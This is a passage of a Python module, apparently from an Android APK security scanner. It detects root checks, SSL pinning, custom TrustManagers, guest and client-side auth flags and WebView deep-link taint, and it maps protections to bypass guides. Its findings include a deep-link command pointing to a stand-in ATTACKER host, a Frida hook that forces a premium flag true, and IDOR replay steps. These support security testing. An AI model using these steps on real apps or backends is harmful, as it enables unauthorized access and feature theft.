"""
Behavioral detection of root/jailbreak checks and SSL pinning — obfuscation
resilient.

The old engine matched vendor class-name substrings against raw dex bytes, so an
app whose classes were renamed by R8/DexGuard (a -> a.b.c) reported "nothing".
This module instead works over apktool's smali (and native .so strings), keying
on signals that SURVIVE renaming:

  * string constants  — su paths, root package ids, "test-keys", pin hashes,
    "onReceivedSslError" — are preserved verbatim in the dex string pool.
  * interface contracts — a class `.implements Ljavax/net/ssl/X509TrustManager;`
    stays detectable even if its name is `Lp3/a;`, and we can read its
    `checkServerTrusted` body to tell trust-all (disabled) from real pinning.
  * native libraries — filenames + strings inside .so for BoringSSL pinning /
    commercial RASP.

It also computes an obfuscation score and records the ACTUAL (possibly renamed)
class names of custom TrustManagers so the Frida generator can hook them by name.
"""

import os
import re

from . import deepscan  # reuse _op long-path helper + string extraction

# ---------------------------------------------------------------------------
#  smali signal tokens  (substring search; robust to renaming)
# ---------------------------------------------------------------------------
# id -> (category, layer, confidence, name, desc, guides, [substrings])
_SMALI_SIGNALS = [
    ("su-path-check", "root", "java", "high", "su binary path check",
     "Looks for the su binary in common on-disk locations.",
     ["frida-file-exists", "objection-root", "magisk-denylist", "smali-patch-root"],
     ["/system/xbin/su", "/system/bin/su", "/sbin/su", "/su/bin/su",
      "/system/bin/failsafe/su", "/data/local/xbin/su"]),
    ("root-packages", "root", "java", "high", "Root-management package check",
     "Enumerates installed packages looking for SuperSU / Magisk / Superuser.",
     ["objection-root", "magisk-denylist", "frida-rootbeer"],
     ["com.topjohnwu.magisk", "eu.chainfire.supersu", "com.noshufou.android.su",
      "com.koushikdutta.superuser", "com.thirdparty.superuser",
      "com.zachspong.temprootremovejb"]),
    ("rootbeer", "root", "java", "high", "RootBeer library",
     "The RootBeer library aggregates ~9 root checks.",
     ["frida-rootbeer", "objection-root", "magisk-denylist"],
     ["Lcom/scottyab/rootbeer", "com/scottyab/rootbeer"]),
    ("magisk-artifacts", "root", "java", "high", "Magisk artifact / path check",
     "Probes for Magisk files, mount namespace or its unix socket.",
     ["magisk-denylist", "magisk-shamiko", "frida-rootbeer"],
     ["/sbin/.magisk", "magisk.db", "MagiskManager", ".magisk/"]),
    ("test-keys", "root", "java", "medium", "Build tags 'test-keys' check",
     "Checks Build.TAGS for test-keys (custom/dev ROM).",
     ["frida-rootbeer", "objection-root", "magisk-props"],
     ["test-keys"]),
    ("safetynet", "root", "framework", "high", "SafetyNet Attestation",
     "Google SafetyNet attestation (server-verified device integrity).",
     ["safetynet-bypass", "magisk-denylist"],
     ["com/google/android/gms/safetynet", "SafetyNetApi"]),
    ("play-integrity", "root", "framework", "high", "Play Integrity API",
     "Play Integrity API — verdict signed by Google, checked server-side.",
     ["play-integrity-fix", "magisk-denylist"],
     ["com/google/android/play/core/integrity", "StandardIntegrityManager",
      "IntegrityManager"]),
    ("emulator-check", "root", "java", "medium", "Emulator detection",
     "Detects emulators (QEMU/Genymotion) via build props & device files.",
     ["frida-rootbeer", "objection-root"],
     ["goldfish", "ranchu", "/dev/qemu_pipe", "generic_x86", "vbox86", "genymotion"]),
    ("pairip", "root", "native", "high", "PairIP integrity protection (Google Play)",
     "Google Play's VM-based anti-tamper / integrity protection (PairIP). The app's "
     "bytecode is moved into an encrypted custom VM (libpairipcore.so, run via "
     "com.pairip.VMRunner.executeVM); it verifies the Play install source, the app "
     "signature, and watches for debuggers / Frida in native code. One of the "
     "hardest protections to bypass.",
     ["pairip-bypass"],
     ["Lcom/pairip/", "com/pairip/VMRunner", "com/pairip/licensecheck",
      "com/pairip/StartupLauncher", "com/pairip/SignatureCheck"]),

    ("okhttp-pinner", "ssl", "java", "high", "OkHttp CertificatePinner",
     "OkHttp CertificatePinner with sha256/ public-key pins.",
     ["objection-ssl-android", "frida-ssl-universal", "frida-okhttp"],
     ["Lokhttp3/CertificatePinner", "okhttp3/CertificatePinner",
      "Certificate pinning failure"]),
    ("trustkit-android", "ssl", "framework", "high", "TrustKit (Android)",
     "DataTheorem TrustKit pinning framework.",
     ["frida-ssl-universal", "objection-ssl-android", "nsc-repack"],
     ["com/datatheorem/android/trustkit"]),
    ("webview-sslerror", "ssl", "java", "medium", "WebView onReceivedSslError",
     "WebView SSL error callback — may enforce or dangerously ignore cert errors.",
     ["frida-webview-ssl"],
     ["onReceivedSslError"]),
]

# native .so string signals
_NATIVE_SIGNALS = [
    ("conscrypt-native-ssl", "ssl", "native", "medium", "Native / BoringSSL pinning",
     "Cert-chain verification / pinning in a native .so (needs a native hook).",
     ["frida-native-ssl", "objection-ssl-android"],
     [b"ssl_verify_cert_chain", b"X509_verify_cert", b"ssl_crypto_x509"]),
    ("freerasp", "root", "native", "medium", "freeRASP / commercial RASP",
     "RASP SDK (Talsec freeRASP or similar) doing native root/hook/tamper checks.",
     ["frida-native-rasp", "magisk-denylist"],
     [b"talsec", b"freerasp", b"AppSecureRoom"]),
]

_LIB_PREFIXES = (
    "Lokhttp3", "Lokio", "Landroid", "Ljava", "Ljavax", "Lkotlin", "Lcom/android",
    "Lorg/bouncycastle", "Lorg/spongycastle", "Lcom/google", "Lorg/apache",
    "Lretrofit2", "Lcom/squareup", "Lio/grpc", "Lorg/conscrypt", "Lorg/chromium",
    "Lcom/datatheorem", "Ltrustkit", "Lcz/msebera", "Landroidx",
    "Lcom/facebook", "Lcom/huawei", "Lio/ktor", "Lio/netty", "Lokhttp",
    "Lcom/microsoft", "Lcom/amazonaws", "Lcom/adobe", "Lcom/newrelic",
    "Lcom/appsflyer", "Lcom/braze", "Lcom/segment", "Lcom/mparticle",
    "Lretrofit", "Lorg/eclipse", "Lorg/jetbrains", "Lcom/rnfs",
    "Lcom/ReactNativeBlobUtil", "Lcom/reactnativecommunity", "Lorg/cocos2dx",
    "Lcom/cloudinary", "Lcom/stripe", "Lcom/paypal", "Lcom/braintree",
)

_FRAMEWORK_LIBS = [
    ("flutter", "Flutter", "libflutter.so",
     "Flutter has its OWN BoringSSL trust store and IGNORES the system/user CA "
     "store and network security config. Use reFlutter or a libflutter.so native "
     "hook — objection/Java SSL hooks will NOT work.", ["flutter-ssl"]),
    ("react-native", "React Native", "libreactnativejni.so",
     "Network goes through OkHttp under the hood, so standard OkHttp/Java hooks "
     "usually work; pinning may also be declared in JS.",
     ["frida-ssl-universal", "objection-ssl-android"]),
    ("xamarin", "Xamarin / .NET MAUI", "libmonodroid.so",
     "HTTP stack is Mono/.NET, not Java — standard Java SSL hooks miss it.",
     ["frida-ssl-universal"]),
    ("unity", "Unity", "libunity.so",
     "Networking via il2cpp/Mono in native code — needs a native/il2cpp hook.",
     ["frida-native-ssl"]),
]


# ---------------------------------------------------------------------------
#  smali scan (parallel)
# ---------------------------------------------------------------------------
_TM_IFACE = "Ljavax/net/ssl/X509TrustManager;"
_HV_IFACE = "Ljavax/net/ssl/HostnameVerifier;"
_CLASS_RE = re.compile(r"^\.class[^\n]*\s(L[^\s;]+;)", re.M)
_CHECK_SRV = re.compile(r"\.method[^\n]*checkServerTrusted.*?\.end method", re.S)

# ---------------------------------------------------------------------------
#  auth-surface signals (broken-access-control / auth-bypass surface)
#  matched as lowercase substrings against smali text — distinctive enough to
#  avoid noise. Keyed group -> distinctive tokens.
# ---------------------------------------------------------------------------
_AUTH_CODE = {
    "guest-access": ["continueasguest", "loginasguest", "guestlogin", "guest_login",
                     "skiplogin", "skip_login", "isguest", "guestmode", "guestsession",
                     "guestuser", "guesttoken", "as_guest", "browseasguest"],
    "anon-access": ["signinanonymously", "anonymouslogin", "anonymous_login",
                    "anonymousauth", "loginanonymous", "authanonymous"],
    "clientside-auth": ["ispremium", "isadmin", "isvip", "ispro(", "isloggedin",
                        "ispaiduser", "isentitled", "hasactivesubscription",
                        "isunlocked", "issubscribed", "isauthorized", "isauthenticated"],
}
_AUTH_ALL = [(g, t) for g, toks in _AUTH_CODE.items() for t in toks]

# dotted library-package prefixes — auth signals inside these are framework noise,
# not the app's own authorization logic
_LIB_DOTTED = (
    "android.", "androidx.", "kotlin.", "kotlinx.", "java.", "javax.", "org.",
    "com.google.", "com.facebook.", "com.huawei.", "io.ktor.", "io.netty.",
    "okhttp3.", "okio.", "retrofit2.", "com.squareup.", "com.microsoft.",
    "com.amazonaws.", "com.adobe.", "com.appsflyer.", "com.braze.", "com.stripe.",
    "com.google.firebase.", "kotlin.jvm.", "dagger.", "j$.",
)


def _smali_worker(files):
    """Scan a batch of smali files; return partial signals."""
    found = {}                 # signal_id -> example evidence string
    custom_tms = []            # (class, trust_all_bool)
    auth = {}                  # auth signal group -> (token, class)
    for ap, rel in files:
        try:
            with open(deepscan._op(ap), "rb") as f:
                b = f.read(4 * 1024 * 1024)
        except OSError:
            continue
        text = b.decode("utf-8", "replace")
        for sig in _SMALI_SIGNALS:
            sid, subs = sig[0], sig[7]
            if sid in found:
                continue
            for s in subs:
                if s in text:
                    found[sid] = s
                    break
        # auth-surface tokens (only need one app-owned example per group; skip
        # signals inside library packages — framework noise, not app auth logic)
        low = text.lower()
        for grp, tok in _AUTH_ALL:
            if grp in auth:
                continue
            if tok in low:
                cm = _CLASS_RE.search(text)
                cls = cm.group(1)[1:-1].replace("/", ".") if cm else rel
                if cls.startswith(_LIB_DOTTED):
                    continue
                auth[grp] = (tok.rstrip("("), cls)
        # deep-link -> WebView taint: a class that reads intent input AND drives a
        # WebView with it (loadUrl/loadData) — classic XSS/RCE-via-deeplink chain
        if "webview-taint" not in found and ("loadUrl" in text or "loadData" in text):
            if any(t in text for t in ("getStringExtra", "getData(", "getIntent(",
                                       "getExtras(", "getQueryParameter")):
                cm = _CLASS_RE.search(text)
                cls = cm.group(1)[1:-1].replace("/", ".") if cm else rel
                if not cls.startswith(_LIB_DOTTED):
                    found["webview-taint"] = cls
        # mutable PendingIntent (hijackable on Android 12+)
        if "pendingintent-mutable" not in found and "Landroid/app/PendingIntent;->get" in text:
            if "FLAG_IMMUTABLE" not in text and "0x4000000" not in text:
                cm = _CLASS_RE.search(text)
                cls = cm.group(1)[1:-1].replace("/", ".") if cm else rel
                if not cls.startswith(_LIB_DOTTED):
                    found["pendingintent-mutable"] = cls
        # hygiene presence flags (aggregated app-wide -> absence is the finding)
        if "_hyg_flagsecure" not in found and "FLAG_SECURE" in text:
            found["_hyg_flagsecure"] = "1"
        if "_hyg_filtertouches" not in found and "filterTouchesWhenObscured" in text.lower() \
                or "setFilterTouchesWhenObscured" in text:
            found["_hyg_filtertouches"] = "1"
        if "_hyg_debuglog" not in found and ("Landroid/util/Log;->d(" in text
                                             or "Landroid/util/Log;->v(" in text):
            cm = _CLASS_RE.search(text)
            found["_hyg_debuglog"] = (cm.group(1)[1:-1].replace("/", ".") if cm else rel)
        if "_hyg_sendbroadcast" not in found and "->sendBroadcast(" in text:
            cm = _CLASS_RE.search(text)
            found["_hyg_sendbroadcast"] = (cm.group(1)[1:-1].replace("/", ".") if cm else rel)
        # custom TrustManager / HostnameVerifier behavioural check
        if _TM_IFACE in text or _HV_IFACE in text:
            cm = _CLASS_RE.search(text)
            cls = cm.group(1) if cm else rel
            if not cls.startswith(_LIB_PREFIXES):
                trust_all = False
                mm = _CHECK_SRV.search(text)
                if mm:
                    body = mm.group(0)
                    # trust-all if it never throws / never checks a certificate
                    trust_all = ("throw" not in body and
                                 "CertificateException" not in body and
                                 "checkValidity" not in body)
                custom_tms.append((cls, trust_all))
    return found, custom_tms, auth


def _scan_smali(unpacked, workers):
    files = []
    for sd in unpacked.smali_dirs:
        base = deepscan._op(sd)
        for dp, _dn, fs in os.walk(base):
            for fn in fs:
                if fn.endswith(".smali"):
                    ap = os.path.join(dp, fn)
                    files.append((ap, os.path.relpath(ap, base).replace("\\", "/")))
    if not files:
        return {}, [], {}
    chunk = max(200, len(files) // (workers * 8) or 1)
    batches = [files[i:i + chunk] for i in range(0, len(files), chunk)]
    merged, custom, auth = {}, [], {}
    used = False
    if workers > 1 and len(files) > 1000:
        try:
            from concurrent.futures import ProcessPoolExecutor
            with ProcessPoolExecutor(max_workers=workers) as ex:
                for f, tms, au in ex.map(_smali_worker, batches):
                    for k, v in f.items():
                        merged.setdefault(k, v)
                    custom.extend(tms)
                    for k, v in au.items():
                        auth.setdefault(k, v)
            used = True
        except Exception:
            used = False
    if not used:
        for b in batches:
            f, tms, au = _smali_worker(b)
            for k, v in f.items():
                merged.setdefault(k, v)
            custom.extend(tms)
            for k, v in au.items():
                auth.setdefault(k, v)
    return merged, custom, auth


# ---------------------------------------------------------------------------
#  auth-surface: guest/anonymous access + client-side flags (broken access ctrl)
# ---------------------------------------------------------------------------
_GUEST_RES_RE = re.compile(
    r'"[^"]*(?:continue as guest|access as guest|browse as guest|as a guest|'
    r'skip (?:login|sign|for now)|continue without (?:login|signing)|'
    r'guest (?:mode|access|login))[^"]*"', re.I)


def _scan_auth_resources(unpacked):
    """Look in decoded string resources for UI evidence of guest/skip-login access."""
    ev = []
    if not unpacked.res_dir:
        return ev
    vroot = unpacked.res_dir
    for dp, _dn, fs in os.walk(deepscan._op(vroot)):
        for fn in fs:
            if not (fn.endswith(".xml") and "values" in dp.lower()):
                continue
            try:
                with open(os.path.join(dp, fn), "rb") as f:
                    t = f.read(2_000_000).decode("utf-8", "replace")
            except OSError:
                continue
            for m in _GUEST_RES_RE.finditer(t):
                s = m.group(0).strip('"')
                if s not in ev:
                    ev.append(s)
                if len(ev) >= 6:
                    return ev
    return ev


def _build_auth_findings(auth, res_evidence):
    F = []
    guest = auth.get("guest-access") or auth.get("anon-access")
    if guest or res_evidence:
        tok, cls = (guest if guest else ("guest UI", None))
        ev_bits = []
        if guest:
            ev_bits.append("code: %s (%s)" % (guest[0], guest[1]))
        if res_evidence:
            ev_bits.append("UI: " + "; ".join(res_evidence[:3]))
        F.append({
            "id": "auth-guest-access",
            "title": "Guest / unauthenticated access path",
            "severity": "high", "category": "auth",
            "location": (guest[1] if guest else "res/values/strings.xml"),
            "evidence": " | ".join(ev_bits),
            "description": "The app exposes a guest / anonymous / skip-login access path. Such "
                           "sessions are frequently under-authorized on the server: they reach "
                           "screens and API calls meant for authenticated users.",
            "risk": "If the backend does not fully enforce authorization for guest/anonymous "
                    "sessions, a guest can reach authenticated functionality and — by changing "
                    "resource identifiers — read or modify OTHER users' data (broken access "
                    "control / IDOR). This is a common critical-severity finding.",
            "reproduce": [
                "Launch the app and take the guest / \"continue as guest\" / skip-login path.",
                "Proxy the device through Burp/mitmproxy and record the guest session token/cookie.",
                "Replay requests to authenticated endpoints (see the API surface list) using the "
                "guest session — check which succeed.",
                "For endpoints that carry a user/account id, change it to another value and see if "
                "you receive another user's data (IDOR).",
            ],
            "mitigation": "Enforce server-side authorization on EVERY endpoint; scope guest sessions "
                          "to a strict allowlist of non-sensitive operations; never rely on the client "
                          "to hide privileged screens/calls.",
            "masvs": "MASVS-AUTH-1"})
    flags = auth.get("clientside-auth")
    if flags:
        tok, cls = flags
        F.append({
            "id": "auth-clientside-flag",
            "title": "Client-side authorization / entitlement flag",
            "severity": "medium", "category": "auth",
            "location": cls, "evidence": "%s (%s)" % (tok, cls),
            "description": "The app branches on a locally-held authorization/entitlement flag "
                           "(e.g. %s). If the decision is made on-device, it can be flipped." % tok,
            "risk": "If premium/admin/role state is decided client-side rather than enforced by the "
                    "server, hooking the getter (Frida) or editing local state unlocks paid/privileged "
                    "features and may expose privileged API calls.",
            "reproduce": [
                "Frida-hook the flag's getter to always return true: "
                "`Java.use('<class>').<method>.implementation = function(){ return true; }`.",
                "Observe whether premium/admin UI and its API calls become available.",
                "Confirm server-side: does the backend independently reject the privileged call?",
            ],
            "mitigation": "Make entitlements server-authoritative; treat client flags as UI hints only "
                          "and re-check every privileged action on the backend.",
            "masvs": "MASVS-AUTH-2"})
    return F


# ---------------------------------------------------------------------------
#  native + manifest + framework
# ---------------------------------------------------------------------------
def _scan_native(unpacked):
    hits, so_names = {}, []
    base = unpacked.raw_dir
    for dp, _dn, fs in os.walk(deepscan._op(base)):
        for fn in fs:
            if not fn.endswith(".so"):
                continue
            so_names.append(fn)
            ap = os.path.join(dp, fn)
            try:
                with open(ap, "rb") as f:
                    b = f.read(24 * 1024 * 1024)
            except OSError:
                continue
            for sig in _NATIVE_SIGNALS:
                sid, subs = sig[0], sig[7]
                if sid in hits:
                    continue
                for s in subs:
                    if s in b:
                        hits[sid] = s.decode("ascii", "replace")
                        break
    return hits, so_names


def _detect_frameworks(so_names, unpacked):
    names = set(so_names)
    fws = []
    for fid, fname, lib, note, guides in _FRAMEWORK_LIBS:
        if lib in names:
            fws.append({"id": fid, "name": fname, "note": note, "guides": guides})
    # cordova: assets/www/cordova.js
    for _dp, _dn, _fs in os.walk(deepscan._op(unpacked.raw_dir)):
        pass
    return fws


def _scan_nsc(unpacked):
    """Decoded network_security_config: look for <pin-set> and cleartext flags."""
    has_pin, cleartext, snippet = False, None, None
    if not unpacked.res_dir:
        return has_pin, cleartext, snippet
    xmldir = os.path.join(unpacked.res_dir, "xml")
    if not os.path.isdir(xmldir):
        return has_pin, cleartext, snippet
    for fn in os.listdir(deepscan._op(xmldir)):
        if not fn.endswith(".xml"):
            continue
        try:
            with open(deepscan._op(os.path.join(xmldir, fn)), "rb") as f:
                t = f.read(400_000).decode("utf-8", "replace")
        except OSError:
            continue
        if "<pin-set" in t or "<pin " in t:
            has_pin = True
            i = t.find("<pin-set")
            snippet = t[max(0, i - 40):i + 400]
        if 'cleartextTrafficPermitted="true"' in t:
            cleartext = True
    return has_pin, cleartext, snippet


# ---------------------------------------------------------------------------
#  obfuscation score
# ---------------------------------------------------------------------------
def _obfuscation(unpacked, sample=4000):
    short = total = 0
    for sd in unpacked.smali_dirs:
        base = deepscan._op(sd)
        for dp, _dn, fs in os.walk(base):
            for fn in fs:
                if not fn.endswith(".smali"):
                    continue
                total += 1
                stem = fn[:-6]
                if len(stem) <= 2 and stem.isalnum():
                    short += 1
                if total >= sample:
                    break
            if total >= sample:
                break
        if total >= sample:
            break
    if total == 0:
        return None
    ratio = short / total
    level = ("heavy" if ratio > 0.5 else "moderate" if ratio > 0.15 else "light")
    return {"ratio": round(ratio, 2), "level": level, "sampled": total}


# ---------------------------------------------------------------------------
#  entry point
# ---------------------------------------------------------------------------
def _build_code_findings(webview_taint, pi_mutable, target_sdk):
    F = []
    if webview_taint:
        F.append({
            "id": "webview-deeplink-taint",
            "title": "Deep-link input reaches a WebView (possible XSS / RCE)",
            "severity": "high", "category": "webview", "location": webview_taint,
            "evidence": webview_taint + " reads intent input AND calls WebView.loadUrl/loadData",
            "description": "A class consumes attacker-influenceable intent data (extras / URI / "
                           "query params) and drives a WebView with it.",
            "risk": "If the URL/HTML is attacker-controlled, a crafted deep link can load arbitrary "
                    "web content in the app's WebView — phishing/XSS, and full RCE if a JavaScript "
                    "bridge (addJavascriptInterface) is exposed to that content.",
            "reproduce": [
                "Find the exported activity + scheme in the deep-link surface list.",
                "`adb shell am start -a android.intent.action.VIEW -d \"<scheme>://host/"
                "?url=https://ATTACKER/poc.html\" <pkg>`.",
                "Serve a poc.html that runs JS / calls any exposed bridge; observe it execute in-app.",
            ],
            "mitigation": "Never load intent-supplied URLs/HTML directly; allowlist origins, disable "
                          "JavaScript for untrusted content, and remove/restrict addJavascriptInterface.",
            "masvs": "MASVS-PLATFORM-2"})
    if pi_mutable:
        # target_sdk arrives from androguard as a string (e.g. "33") — coerce
        try:
            ts = int(target_sdk)
        except (TypeError, ValueError):
            ts = 0
        sev = "medium" if ts >= 31 else "low"
        F.append({
            "id": "pendingintent-mutable",
            "title": "Mutable PendingIntent",
            "severity": sev, "category": "config", "location": pi_mutable,
            "evidence": pi_mutable + " uses PendingIntent without FLAG_IMMUTABLE",
            "description": "A PendingIntent is created without FLAG_IMMUTABLE, so its base Intent can "
                           "be filled in by whoever receives it.",
            "risk": "A malicious app that obtains the PendingIntent can populate unfilled fields "
                    "(component/data/extras) and have your app perform the action with your app's "
                    "identity/permissions (intent hijacking / privilege escalation).",
            "reproduce": ["Locate the PendingIntent.getActivity/Broadcast/Service call in %s." % pi_mutable,
                          "Check whether a component is set and FLAG_IMMUTABLE is absent."],
            "mitigation": "Set FLAG_IMMUTABLE (required behaviour on Android 12+/targetSdk 31), and "
                          "always set an explicit component on the base Intent.",
            "masvs": "MASVS-PLATFORM-1"})
    return F


_KBCACHE_RE = re.compile(
    r'android:inputType="[^"]*(?:textPassword|textVisiblePassword|numberPassword|'
    r'textWebPassword)[^"]*"')


def _scan_keyboard_cache(unpacked):
    """Password fields in layouts that don't disable suggestions/personalized
    learning get cached by the keyboard (recoverable plaintext)."""
    if not unpacked.res_dir:
        return []
    hits = []
    for dp, _dn, fs in os.walk(deepscan._op(unpacked.res_dir)):
        if "layout" not in dp.lower():
            continue
        for fn in fs:
            if not fn.endswith(".xml"):
                continue
            try:
                with open(os.path.join(dp, fn), "rb") as f:
                    t = f.read(600_000).decode("utf-8", "replace")
            except OSError:
                continue
            for m in _KBCACHE_RE.finditer(t):
                seg = m.group(0)
                if "textNoSuggestions" not in seg and "textNoPersonalizedLearning" not in seg:
                    hits.append("res/layout/%s" % fn)
                    break
    return sorted(set(hits))[:12]


def _build_hygiene_findings(hyg, kbcache):
    """Low-severity hygiene checks (parity with common APK scanners)."""
    F = []
    # FLAG_SECURE / tapjacking — absence across the whole app
    if "flagsecure" not in hyg:
        F.append({
            "id": "no-flag-secure", "title": "No FLAG_SECURE (screens capturable / overlayable)",
            "severity": "low", "category": "platform", "location": "app code",
            "evidence": "WindowManager.LayoutParams.FLAG_SECURE never set",
            "description": "The app never sets FLAG_SECURE on any window, so its screens can be "
                           "screenshotted, screen-recorded, and shown in the recents thumbnail.",
            "risk": "Sensitive screens (login, OTP, payment, tokens) can be captured by malware with "
                    "screen-recording, by the OS recents snapshot, or overlaid by a tapjacking app.",
            "reproduce": ["Open a sensitive screen and take a screenshot / screen recording — it succeeds.",
                          "Check the recents (overview) thumbnail for exposed data."],
            "mitigation": "Add `getWindow().setFlags(FLAG_SECURE, FLAG_SECURE)` on activities that show "
                          "sensitive data.", "masvs": "MASVS-PLATFORM-3"})
    if "filtertouches" not in hyg:
        F.append({
            "id": "tapjacking", "title": "Tapjacking possible (no obscured-touch filtering)",
            "severity": "low", "category": "platform", "location": "app code",
            "evidence": "setFilterTouchesWhenObscured / filterTouchesWhenObscured not used",
            "description": "No view enables filterTouchesWhenObscured, so a malicious overlay can sit on "
                           "top and trick the user into tapping through it (tapjacking).",
            "risk": "An overlay app can hijack taps on sensitive buttons (grant permission, confirm "
                    "payment) without the user realising.",
            "reproduce": ["Draw a SYSTEM_ALERT_WINDOW overlay over a sensitive button and confirm taps "
                          "pass through."],
            "mitigation": "Set android:filterTouchesWhenObscured=\"true\" (or FLAG_SECURE) on sensitive "
                          "views/activities.", "masvs": "MASVS-PLATFORM-3"})
    if "debuglog" in hyg:
        F.append({
            "id": "debug-logging", "title": "Debug logging present in release",
            "severity": "info", "category": "code", "location": hyg["debuglog"],
            "evidence": "Log.d()/Log.v() calls present",
            "description": "The shipped app calls Log.d()/Log.v(). Debug logging often leaks tokens, "
                           "PII or request/response bodies to logcat.",
            "risk": "Any app with READ_LOGS (or a rooted/compromised device, or `adb logcat`) can read "
                    "whatever is logged.",
            "reproduce": ["`adb logcat | grep %s` while exercising the app; watch for sensitive data."
                          % (hyg["debuglog"].split(".")[-1])],
            "mitigation": "Strip logging in release (ProGuard `assumenosideeffects` on android.util.Log) "
                          "and never log secrets/PII.", "masvs": "MASVS-STORAGE-2"})
    if "sendbroadcast" in hyg:
        F.append({
            "id": "broadcast-unprotected", "title": "Broadcasts sent (review for missing permission)",
            "severity": "info", "category": "platform", "location": hyg["sendbroadcast"],
            "evidence": "sendBroadcast() used",
            "description": "The app sends broadcasts. If sent without a receiver permission, any app can "
                           "register a receiver and read the Intent contents.",
            "risk": "Sensitive data placed in a broadcast Intent can be intercepted by another app; "
                    "unprotected dynamic receivers can also be triggered by others.",
            "reproduce": ["Register a receiver for the action in a second app and log received Intents."],
            "mitigation": "Use LocalBroadcastManager / explicit intents, or send with a signature-level "
                          "permission; never broadcast secrets.", "masvs": "MASVS-PLATFORM-1"})
    if kbcache:
        F.append({
            "id": "keyboard-cache", "title": "Password fields without keyboard-cache protection",
            "severity": "low", "category": "storage", "location": ", ".join(kbcache[:6]),
            "evidence": "password inputType without textNoSuggestions/textNoPersonalizedLearning",
            "description": "Password EditText fields don't disable suggestions/personalized learning, so "
                           "the keyboard may cache the typed characters.",
            "risk": "Cached input can be recovered from the keyboard's dictionary/learning store on a "
                    "shared or compromised device, leaking passwords/PII.",
            "reproduce": ["Type into the field, then inspect the keyboard app's user-dictionary / cache."],
            "mitigation": "Add textNoSuggestions|textNoPersonalizedLearning to the inputType of "
                          "sensitive fields.", "masvs": "MASVS-STORAGE-2"})
    return F


def _native_hardening(unpacked):
    """checksec-style flags on each app .so via LIEF: NX, PIE, RELRO, stack canary."""
    weak = []
    try:
        import lief
    except Exception:
        return []
    seen = 0
    for dp, _dn, fs in os.walk(deepscan._op(unpacked.raw_dir)):
        for fn in fs:
            if not fn.endswith(".so") or seen >= 60:
                continue
            path = os.path.join(dp, fn)
            try:
                b = lief.parse(path)
                if b is None or not isinstance(b, lief.ELF.Binary):
                    continue
            except Exception:
                continue
            seen += 1
            missing = []
            try:
                if not b.has_nx:
                    missing.append("NX")
            except Exception:
                pass
            try:
                if not b.is_pie:
                    missing.append("PIE")
            except Exception:
                pass
            try:
                canary = any(s.name == "__stack_chk_fail" for s in b.symbols)
                if not canary:
                    missing.append("stack-canary")
            except Exception:
                pass
            try:
                relro = getattr(b, "has_relro", None)
                if relro is False:
                    missing.append("RELRO")
            except Exception:
                pass
            if missing:
                weak.append((fn, missing))
    if not weak:
        return []
    listing = ", ".join("%s [%s]" % (n, "/".join(m)) for n, m in weak[:12])
    return [{
        "id": "native-hardening",
        "title": "Native libraries missing exploit mitigations (%d)" % len(weak),
        "severity": "low", "category": "hardening",
        "location": "lib/*/*.so",
        "evidence": listing + ("…" if len(weak) > 12 else ""),
        "description": "Some bundled .so libraries are built without standard exploit mitigations "
                       "(NX, PIE/ASLR, stack canary, or full RELRO).",
        "risk": "Missing mitigations make memory-corruption bugs in the native code materially easier "
                "to exploit (predictable addresses, executable stack, unprotected GOT).",
        "reproduce": ["`checksec --file=lib/arm64-v8a/<name>.so` to confirm the flags.",
                      "Cross-reference with any native crash / fuzzing findings."],
        "mitigation": "Rebuild native code with -fPIE -pie, -fstack-protector-strong, "
                      "-Wl,-z,relro,-z,now, and a non-executable stack.",
        "masvs": "MASVS-CODE-4"}]


def _mk(sig, evidence, extra=None):
    m = {"id": sig[0], "name": sig[4], "category": sig[1], "layer": sig[2],
         "confidence": sig[3], "desc": sig[5], "evidence": evidence,
         "guides": sig[6]}
    if extra:
        m.update(extra)
    return m


def analyze(unpacked, workers=4, target_sdk=None):
    smali_hits, custom_tms, auth_signals = _scan_smali(unpacked, workers)
    auth_findings = _build_auth_findings(auth_signals, _scan_auth_resources(unpacked))
    # pull synthetic code-taint signals out before the mechanism loop
    webview_taint = smali_hits.pop("webview-taint", None)
    pi_mutable = smali_hits.pop("pendingintent-mutable", None)
    hyg = {k[5:]: smali_hits.pop(k) for k in list(smali_hits) if k.startswith("_hyg_")}
    native_hits, so_names = _scan_native(unpacked)
    misc = _build_code_findings(webview_taint, pi_mutable, target_sdk)
    misc += _native_hardening(unpacked)
    misc += _build_hygiene_findings(hyg, _scan_keyboard_cache(unpacked))
    frameworks = _detect_frameworks(so_names, unpacked)
    has_pin, cleartext, snippet = _scan_nsc(unpacked)
    obf = _obfuscation(unpacked)

    by_id = {s[0]: s for s in _SMALI_SIGNALS}
    by_id_native = {s[0]: s for s in _NATIVE_SIGNALS}

    root, ssl, vulns = [], [], []
    discovered = {"trust_all": [], "custom_tm": [], "rootbeer": "rootbeer" in smali_hits}

    for sid, ev in smali_hits.items():
        sig = by_id[sid]
        (root if sig[1] == "root" else ssl).append(_mk(sig, ev))
    for sid, ev in native_hits.items():
        sig = by_id_native[sid]
        (root if sig[1] == "root" else ssl).append(_mk(sig, ev))

    # PairIP: libpairipcore.so is an independent, strong signal — ensure it is
    # reported even if the smali class-ref scan missed it (and mark it as native
    # evidence when it did fire).
    if any(n == "libpairipcore.so" for n in so_names):
        psig = by_id["pairip"]
        existing = next((m for m in root if m["id"] == "pairip"), None)
        if existing:
            existing["evidence"] = (existing.get("evidence", "") + ", libpairipcore.so").strip(", ")
        else:
            root.append(_mk(psig, "libpairipcore.so"))
        discovered["pairip"] = True

    # custom TrustManagers discovered behaviourally — COLLAPSE into one mechanism
    # (each library ships its own; listing them all would inflate "layers"), and
    # treat trust-all (disabled validation) as a VULNERABILITY, not a protection.
    trust_all_names, custom_names = [], []
    for cls, trust_all in custom_tms:
        java_name = cls[1:-1].replace("/", ".") if cls.startswith("L") else cls
        (trust_all_names if trust_all else custom_names).append(java_name)
    trust_all_names = sorted(set(trust_all_names))
    custom_names = sorted(set(custom_names))
    discovered["trust_all"] = trust_all_names
    discovered["custom_tm"] = custom_names[:40]

    if custom_names:
        listing = ", ".join(n.split(".")[-1] for n in custom_names[:6])
        ssl.append({
            "id": "custom-trustmanager",
            "name": "Custom X509TrustManager / pinning (%d class%s)"
                    % (len(custom_names), "es" if len(custom_names) != 1 else ""),
            "category": "ssl", "layer": "java", "confidence": "high", "verified": True,
            "desc": "App-owned classes implement custom TrustManagers with "
                    "certificate-validation logic (hand-rolled pinning or validation): "
                    + listing + ("…" if len(custom_names) > 6 else ""),
            "evidence": listing, "count": len(custom_names),
            "guides": ["frida-ssl-universal", "objection-ssl-android"]})

    for java_name in trust_all_names:
        vulns.append({
            "id": "trustall-" + java_name.split(".")[-1].lower(),
